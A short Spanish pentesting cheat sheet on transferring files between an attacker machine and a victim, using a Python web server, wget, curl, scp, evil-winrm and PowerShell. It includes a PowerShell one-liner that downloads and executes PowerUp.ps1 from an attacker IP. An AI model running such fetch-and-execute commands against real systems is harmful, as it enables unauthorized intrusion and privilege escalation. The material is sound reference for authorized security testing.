
# Transferir ficheros

## Servidor de Python

Atacante:

```
python3 -m http.server <puerto>
```

Descargar con wget, curl o alguna herramienta de este tipo, desde la víctima.

## wget

```
wget http://<rutaFicheroDescargar>
````

## Curl

```
curl http://<IPAtacante>:<puertoatacante>/<fichero> -o <nombresalida>
```

## Scp (SSH)

Por ejemplo, copiemos un archivo de ejemplo desde nuestra máquina, a una máquina remota:

```
scp <fileRemote> <userRemoteSystem>@<IPremotesystem>:</fileRemote>
```
fileRemote: Nombre con el que deseamos almacenar el archivo en el sistema remoto.


Para copiar un archivo desde un ordenador remoto en la que no estamos conectados:

```
scp <userRemote@IPremote>:</fileRemote> <fileLocal>
```
fileLocal: Nombre con el que deseamos almacenar el archivo en nuestro sistema.

## Powershell

Ejemplo:

```
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.23.20.245:8000/PowerUp.ps1')
```

# Upload evil-winrm

Si estamos con evil-winrm podemos subir un fichero en la víctima con:

```
upload <ficheroParaSubir> <rutaWindowsDondeSeVayaASubir>
```

Se guardará en la ruta de Kali donde se haya ejecutado la herramienta, y sino en el primer parámetro poner la ruta entera de Kali donde está el fichero.

También podemos descargar un fichero de la víctima, a nuestro sistema atacante con:

```
download <ficheroAdescargar>
```
